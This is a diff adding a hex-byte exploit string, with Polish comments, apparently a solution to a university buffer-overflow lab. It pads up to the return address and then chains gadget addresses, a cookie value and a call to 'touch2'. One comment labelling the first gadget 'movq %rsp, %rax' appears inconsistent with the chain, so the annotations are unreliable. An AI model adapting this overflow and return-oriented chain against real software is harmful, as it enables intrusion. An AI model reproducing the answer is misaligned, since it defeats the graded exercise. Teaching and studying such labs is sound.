@@ -1,0 +1,9 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* dotąd padding, aby móc nadpisać adres powrotu */
+4d 1d 40 00 00 00 00 00 /* adres instrukcji zawierającej movq %rsp, %rax */
+b8 dd 2e 2c 00 00 00 00 /* ciasteczko w little endian */
+5e 1d 40 00 00 00 00 00 /* adres instrukcji zawierającej movq %rax, %rdi */
+d3 1b 40 00 00 00 00 00 /* wywołanie touch2 */
